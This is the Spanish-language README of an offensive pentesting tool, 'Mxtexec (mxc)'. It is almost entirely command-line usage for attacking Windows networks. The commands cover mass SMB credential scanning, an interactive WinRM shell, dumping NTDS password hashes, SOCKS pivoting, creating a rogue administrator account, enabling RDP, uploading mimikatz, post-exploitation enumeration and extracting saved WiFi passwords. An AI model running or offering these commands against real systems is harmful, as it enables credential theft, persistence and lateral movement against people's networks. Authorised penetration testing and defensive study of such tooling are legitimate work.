# Mxtexec (mxc) - La tortuga más letal del pentesting 🐢💀

## Instalación rápida
```bash
git clone https://github.com/Falconmx1/Mxtexec.git
cd Mxtexec
pip install -e .

Escaneo CIDR masivo con multithreading
mxc smb 192.168.1.0/24 -u admin -p Pass123 --shares -t 50

Shell interactivo por WinRM
mxc winrm 192.168.1.100 -u administrator -p Pass123 --interactive

Dumpear hashes NTDS (secretsdump)
mxc smb 192.168.1.100 -u admin -p Pass123 --dump-hashes

SOCKS proxy para pivotear
mxc proxy --start --port 1080
# Ahora usa proxychains: proxychains nmap -sT -Pn 10.0.0.0/24

Post-explotación: agregar usuario admin y habilitar RDP
mxc winrm 192.168.1.100 -u admin -p Pass123 --add-admin hacker Pass123!
mxc winrm 192.168.1.100 -u admin -p Pass123 --enable-rdp

Subir/descargar archivos
mxc winrm 192.168.1.100 -u admin -p Pass123 --upload mimikatz.exe C:\\Windows\\Temp\\mimi.exe
mxc winrm 192.168.1.100 -u admin -p Pass123 --download C:\\flag.txt flag.txt

Post-explotación completa (info del sistema, usuarios, etc.)
mxc winrm 192.168.1.100 -u admin -p Pass123 --post-exploit

Dumpear contraseñas WiFi guardadas
mxc winrm 192.168.1.100 -u admin -p Pass123 --dump-wifi
